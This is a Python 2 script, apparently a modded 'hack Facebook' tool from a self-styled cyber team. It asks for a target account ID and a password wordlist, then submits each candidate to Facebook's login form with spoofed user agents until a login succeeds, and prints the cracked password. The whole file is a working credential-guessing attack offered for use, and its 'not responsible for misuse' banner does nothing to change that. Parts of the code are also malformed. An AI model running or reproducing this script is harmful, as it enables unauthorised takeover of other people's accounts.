#!usr
# -*- coding: UTF-8 -*-
# Mod by: MR.Z33SH44N
# Team: Life Of Programmer


import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print
    runntxt(GL+"            As Salam u Alaikum. ^_^")
    runntxt(WW+"   ..................  Mujhse Contaact Krne Kliye")
    runntxt(WW+"     ....       MR.Z33SH44N")
    runntxt(GL+"                   Stay At Home")
    runntxt(GG+"     ..........     Stay Safe & Happiie")
    runntxt(Y+"    ............       Don't Copy  Pap's Script")
    runntxt(GG+"           Samjh Laggı ")
    time.sleep(1.5)
    
    print GG+" √=============================================√"
    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
    print GG+"  √=============================================√"
    print WW+"  |            MOD BY: Z33SH44N                 |"
    print GL+"  |     Em Not Responsible  for  any  Missuse   |"
    print WW+"  |        TEAM : PAKISTAN CYBER ErRoR SyStEm   |"          |"
    print Y+"   |             INSTAGRAM: CR4CK3RZE3           |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   HACK FACEBOOK Ze3 ^_^   •••••••••|"
    print GG+"  √=============================================√"

banner()

print wd+"         Don't Use for illegal Purposes 😉"
print GG+"╭────\033[91m[\033[96m Enter ID\033[95m / \033[96mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[96mEnter File Wordlist \033[95m( pass.txt ) \033[91;1m]"
password_list = str(raw_input(GG+"╰────➲\033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] Hack Fb Again...\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 Target.py')
                elif g == 'n' or g == 'N':
                    print wd+"Tool Se Exit Marni..."
                    sys.exit()
                else:
                    print RR+"Sahii Intekhab Krein..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit Wordlist Krni.? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"Keluar Dari Program..."
                sys.exit()

        else:
                print RR+"Sahii Intekhab Krein..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" Wordlist Nhi Mill raha Hai😑..."
        print " "
def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = iqbalz_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
			print ("\033[96m                S U C C E S S")
			print "          P A S S W O R D  F I N D "
                  	print RR+"+-------------------------------------------+"
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
        	        print " "
        	        raw_input(WW+"Prexx Enter To Exit...")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop..."
      edit_wordlist()
      sys.exit()    	    
def life():
	global iqbalz_password
	password_nob = open(password_list, "r")
	for iqbalz_password in password_nob:
		password_nob = iqbalz_password.replace("\n","")
		iqbalz(iqbalz_password)		

def runn_noobs():
         global password_list

         lop = GG+"""

                  `.-://////:-.`
              .:+o+:-..````..-:+o+:.
           `:o+-`                `:+o:`
         `/o:`                      `:o/`
        -s/`  .-..`            `..--` `/s-
       /o.   `:.`.-:----------:-.``:-   .o/
      /o`    .:`    `              --    `o/
     -s.     .:`                   --     .s-
     o/     .:`                     --     +o
    .s-     :.                      `:`    -s`
    .s.     :.                      `:`    .s.
    .s-     --                      .:     -s.
     o/     `-.                    `-.     /o
     -s.     `--`                `.-`     .s-
      /o` ----``..--..`    `...--.`      `o/
       /o. `----`  `-.      `-.         .o/
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                  `.-::////::-.` \033[91;1m

                \033[90;1mLife Of Programmer\033[91;1m
             Powered by:\033[97m MR.Z33SH4N
      """


         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
         print " "

if __name__=='__main__':
	main()	
